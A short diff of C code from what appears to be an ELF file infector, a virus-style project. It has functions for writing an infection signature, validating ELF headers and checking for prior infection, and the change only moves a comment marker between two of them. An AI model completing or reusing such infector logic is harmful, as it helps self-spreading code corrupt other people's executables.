@@ -134,7 +134,7 @@ static void		write_mem(uint8_t *path) {
 			|| write(dst, SIGN, SIGN_SZ) != SIGN_SZ)
 	close(dst);
 }
-
+/*
 static int		test_elf_hdr(void) {
 	if (str_n_cmp((char *)hdrs.elf->e_ident, (IDENT), 5)
 			|| (hdrs.elf->e_type != ET_EXEC && hdrs.elf->e_type != ET_DYN)
@@ -143,7 +143,7 @@ static int		test_elf_hdr(void) {
 		return (-1);
 	return (0);
 }
-/*
+
 static int		check_infection(void) {
 	if (sz.mem < SIGN_SZ)
 		return (-1);
